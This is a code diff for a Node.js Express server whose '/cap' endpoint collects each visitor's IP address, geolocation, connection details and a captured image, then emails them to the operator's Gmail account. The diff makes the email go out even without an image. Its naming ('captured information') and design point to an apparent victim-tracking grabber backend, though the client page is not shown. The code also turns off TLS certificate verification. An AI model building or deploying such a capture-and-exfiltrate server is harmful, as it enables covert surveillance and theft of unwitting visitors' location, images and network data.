@@ -1,43 +1,43 @@
+require("dotenv").config();
 const express = require("express");
 const nodemailer = require("nodemailer");
 const requestIp = require("request-ip");
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
 app.use(express.json({ limit: "10mb" }));
 app.use(express.static("public"));
 
 // Configuração do Nodemailer
 const transporter = nodemailer.createTransport({
-  service: "gmail", // Ou outro serviço de e-mail que você estiver usando
+  service: "gmail",
   auth: {
-    user: process.env.EMAIL_USER, // Substitua pelo seu e-mail
-    pass: process.env.EMAIL_PASS, // Substitua pela sua senha
+    user: process.env.EMAIL_USER, // Pegando do .env
+    pass: process.env.EMAIL_PASS, // Pegando do .env
   },
   tls: {
-    rejectUnauthorized: false, // Adicione isso caso você tenha problemas com conexões TLS
+    rejectUnauthorized: false,
   },
 });
 
 // Função para enviar e-mail
 function sendEmail(ip, location, connection, imageBuffer) {
   const mailOptions = {
-    from: process.env.EMAIL_USER, // Usando variável de ambiente
-    to: process.env.EMAIL_USER, // Usando variável de ambiente
+    from: process.env.EMAIL_USER,
+    to: process.env.EMAIL_USER,
     subject: "Informações Capturadas - Endpoint /cap",
-    text: `Informações Capturadas:
-    IP: ${ip}`,
-    attachments: [
-      {
-        filename: `${Date.now()}.png`, // Nome do arquivo
-        content: imageBuffer, // Conteúdo do arquivo
-        encoding: "base64", // Codificação para enviar como base64
-      },
-    ],
+    text: `Informações Capturadas:\nIP: ${ip}\nLocalização: ${location?.latitude}, ${location?.longitude}\nConexão: ${connection?.effectiveType}, ${connection?.downlink}Mbps, RTT: ${connection?.rtt}ms`,
+    attachments: imageBuffer
+      ? [
+          {
+            filename: `${Date.now()}.png`,
+            content: imageBuffer,
+            encoding: "base64",
+          },
+        ]
+      : [],
   };
-
-  console.log("Enviando e-mail...");
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
@@ -50,35 +50,21 @@ function sendEmail(ip, location, connection, imageBuffer) {
 
 // Endpoint /cap
 app.post("/cap", (req, res) => {
-  const ip = requestIp.getClientIp(req); // Captura o IP real
+  const ip = requestIp.getClientIp(req);
   const { image, location, connection } = req.body;
 
-  // Log IP
   console.log(`IP: ${ip}`);
-
-  // Log localização se disponível
   if (location) {
-    console.log(
-      `Localização: Latitude ${location.latitude}, Longitude ${location.longitude}`
-    );
+    console.log(`Localização: Latitude ${location.latitude}, Longitude ${location.longitude}`);
   }
-
-  // Log informações de conexão se disponíveis
   if (connection) {
-    console.log(
-      `Conexão: Tipo ${connection.effectiveType}, Downlink ${connection.downlink}, RTT ${connection.rtt}`
-    );
+    console.log(`Conexão: Tipo ${connection.effectiveType}, Downlink ${connection.downlink}, RTT ${connection.rtt}`);
   }
 
-  // Converter imagem para buffer e enviar no e-mail
-  if (image) {
-    const imageBuffer = Buffer.from(image.split(",")[1], "base64");
-    sendEmail(ip, location, connection, imageBuffer); // Envia a imagem como anexo
-  }
+  const imageBuffer = image ? Buffer.from(image.split(",")[1], "base64") : null;
+  sendEmail(ip, location, connection, imageBuffer);
 
   res.send({ status: "success", ip });
 });
 
-app.listen(PORT, () =>
-  console.log(`Servidor rodando em http://localhost:${PORT}`)
-);
+app.listen(PORT, () => console.log(`Servidor rodando em http://localhost:${PORT}`));
